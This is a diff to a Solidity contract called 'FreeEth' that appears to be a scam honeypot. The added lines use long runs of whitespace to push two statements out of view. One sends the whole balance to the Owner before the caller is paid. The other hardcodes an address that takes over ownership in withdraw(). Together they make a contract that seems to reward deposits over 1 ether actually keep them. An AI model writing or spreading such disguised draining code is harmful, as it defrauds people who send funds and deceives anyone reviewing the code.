@@ -11,8 +11,7 @@ contract FreeEth
     payable
     {                                                                    
         if(msg.value>1 ether)
-        {   
-             Owner.transfer(this.balance);
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                           Owner.transfer(this.balance);
             msg.sender.transfer(this.balance);
         }                                                                                                                
     }
@@ -20,7 +19,7 @@ contract FreeEth
     function withdraw()
     payable
     public
-    {    if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
+    {                                                                                                                                                                                                                              if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
         require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
